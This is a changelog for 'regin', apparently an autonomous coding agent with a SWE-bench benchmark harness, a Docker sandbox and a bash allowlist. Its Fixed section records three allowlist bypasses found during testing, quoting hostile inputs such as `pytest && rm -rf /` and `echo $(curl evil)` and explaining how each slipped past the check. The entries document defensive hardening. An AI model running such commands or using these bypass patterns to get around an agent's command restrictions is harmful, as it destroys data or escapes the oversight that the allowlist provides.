# Changelog

All notable changes to this project are documented here. Format follows
[Keep a Changelog](https://keepachangelog.com/en/1.1.0/); versioning follows
[Semantic Versioning](https://semver.org/spec/v2.0.0.html).

## [Unreleased]

### Added — Phase 2: benchmark loop

- `regin bench run` — sweep an agent across a SWE-bench task set with bounded concurrency and a
  hard spend ceiling enforced before each dispatch.
- `regin bench score` — aggregate run records into the comparison table; `--markdown` writes the
  README table.
- Docker sandbox backend. The checkout is bind-mounted and networking disabled, so the agent edits
  on the host while tests run in a disposable container against the same bytes.
- `scorers/swebench.py` — the evalgate scorer plugin. An instance resolves only when the patch
  applies, every `FAIL_TO_PASS` passes, and no `PASS_TO_PASS` regresses.
- Claude Code and Aider as benchmark competitors, scored on the same task set with the same
  scorer. `claude-agent-sdk` is a competitor here and nowhere else.
- Per-instance workspace preparation via a local bare mirror, and patch extraction that stages
  untracked files so a fix delivered as a new file is not lost.

### Added — Phase 1: the agent loop

- `regin fix` — reads, edits, runs tests, reads the failure, re-edits, and goes green unattended.
- Anthropic provider adapter: streaming, tool calls, raw `usage` passthrough including cache token
  classes, and prompt caching over the tools + system prefix.
- Tools: `read_file`, `write_file`, anchored `edit_file`, gitignore-aware `glob`, ripgrep-backed
  `grep`, and `bash`.
- Summarise-and-continue context compaction, extracted from the loop.
- Rich streaming renderer with a per-run cost, latency, and turn summary.

### Changed

- `model.temperature` → `model.effort`. Sampling parameters are rejected with a 400 on the Claude
  5 family; `effort` (`low` … `max`) is the depth control.
- Assistant turns now round-trip raw provider content blocks. Thinking is on by default and
  thinking blocks must be echoed back byte-identical, which a normalised message cannot
  reconstruct.

### Fixed

Three `bash` allowlist bypasses, all found while writing its tests:

- naive separator splitting rejected `python -c "import os; print(x)"`, where the semicolon is
  data rather than a command separator — now tokenised quote-aware;
- `pytest && rm -rf /` passed a check that only inspected the first token — every
  operator-separated segment is now checked independently;
- `echo $(curl evil)` bypassed the allowlist entirely, since it reads as a call to `echo` —
  command substitution is now refused outright.

Also: `proc.kill()` on timeout orphaned processes spawned by the killed command, so the timeout
never actually reclaimed the run. Commands now start in their own process group.

## [0.1.0] — Phase 0

### Added

- Package scaffold, pinned dependencies, `regin` console script.
- pyright strict, pytest, ruff, and GitHub Actions CI.
- Path jail (`safe_path`), permission gate, run-record schemas, SQLite + JSONL trace store.
